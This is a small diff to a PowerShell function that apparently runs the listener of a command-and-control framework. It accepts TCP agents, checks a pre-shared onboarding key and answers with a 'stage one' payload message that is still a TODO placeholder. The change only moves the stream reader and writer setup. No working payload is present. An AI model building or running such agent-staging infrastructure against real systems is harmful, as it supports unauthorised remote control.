@@ -53,6 +53,8 @@ Function Global:New-Listerner()
 		if($client = $listener.AcceptTcpClient())
 		{
 			$Stream = $client.GetStream()
+			$StreamWriter = New-Object System.IO.StreamWriter($Stream)
+			$StreamReader = New-Object System.IO.StreamReader($Stream)
 			# add agent to listerner
 			#$thisListerner = Get-Listerner -UUID ($obj.UUID.toString())
 			#$agentCount    = $thisListerner.AGENTCOUNT++
@@ -71,9 +73,7 @@ Function Global:New-Listerner()
 			# build our logic for  onboarding connections
 			[void]$PowerShell.AddScript({
 				
-				$StreamWriter = New-Object System.IO.StreamWriter($Stream)
-				$StreamReader = New-Object System.IO.StreamReader($Stream)
-
+			
 				if($StreamReader.ReadLine() == "Onboard:$PSK")
 				{
 					$StreamWriter.WriteLine("Purr! Welcome to stage one, here is your payload: <TODO>") | Out-Null
@@ -92,7 +92,7 @@ Function Global:New-Listerner()
 				$StreamWriter.Close()
 
 			})
-			$AsyncObject = $PowerShell.BeginInvoke($Stream)
+			$AsyncObject = $PowerShell.BeginInvoke($StreamReader,$StreamWriter)
 			"sock!"
 		}
 		
